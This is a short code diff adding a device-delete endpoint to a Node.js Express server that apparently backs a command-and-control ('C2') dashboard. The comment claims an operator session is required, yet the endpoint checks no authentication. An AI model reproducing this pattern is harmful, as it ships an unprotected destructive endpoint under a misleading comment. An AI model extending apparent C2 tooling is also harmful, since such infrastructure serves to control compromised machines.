@@ -587,6 +587,23 @@ app.post('/api/rename-device', (req, res) => {
     }
 });
 
+// Device Delete Endpoint (operator session required)
+app.post('/api/delete-device', (req, res) => {
+    try {
+        const { deviceId } = req.body || {};
+        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
+        if (devices.has(deviceId)) {
+            devices.delete(deviceId);
+            saveData();
+            console.log(`[DEVICE DELETED] Removed device ${deviceId} from registry`);
+            return res.json({ success: true });
+        }
+        res.status(404).json({ success: false, error: 'Device not found' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
 // Route Handler for Render C2 Dashboard Navigation
 app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
     return res.redirect('/');
